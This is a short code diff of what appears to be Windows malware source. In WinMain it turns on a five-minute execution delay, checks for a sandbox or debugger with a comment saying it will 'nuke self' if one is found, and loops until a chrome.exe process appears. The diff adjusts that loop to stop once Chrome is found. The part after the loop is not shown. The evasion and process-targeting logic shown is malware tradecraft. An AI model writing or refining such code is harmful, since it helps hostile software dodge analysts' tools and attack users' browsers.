@@ -54,6 +54,7 @@ WCHAR* debuggers[] = {
 };
 */
 
+
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
 	AntiAnalysis hide;
@@ -68,7 +69,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
 	auto resolved	  = resolver.GetAPIAccess();
 	
-	//hide.DelayExecution(5, resolver); // wait 5 minutes before execution
+	hide.DelayExecution(5, resolver); // wait 5 minutes before execution
 
 	
 	DWORD process = 0; 
@@ -77,9 +78,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	{
 		hide.IsBeingWatched(resolver); // Nuke self if in sandbox or debugger
 		process = GetPID("chrome.exe");
-		hide.DelayExecution(0.2, resolver);
 
+		if (process != 0)
+		{
+			hide.DelayExecution(0.2, resolver);
+			break;
+		}
 
+		hide.DelayExecution(0.2, resolver); // This should be every couple of minutes
 	} while (process == 0);
 
 
